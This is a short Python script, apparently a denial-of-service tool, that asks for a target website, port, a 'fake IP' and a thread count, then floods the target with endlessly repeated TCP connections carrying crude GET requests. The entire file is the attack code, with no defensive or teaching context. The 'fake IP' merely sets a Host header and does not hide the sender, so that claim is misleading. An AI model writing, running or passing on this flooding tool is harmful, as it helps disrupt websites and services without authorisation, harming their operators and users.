import socket
import threading

fake_ip = input("Fake IP address: ")
target = input("Target website: ")
port = int(input("Target Port: "))
attack_count = int(input("Amount of attacks: "))


def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
                     (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),
                     (target, port))
            s.close()
            print("Sucessfull")
        except ConnectionRefusedError:
            print("Server Error")


for i in range(attack_count):
    thread = threading.Thread(target=attack)
    thread.start()
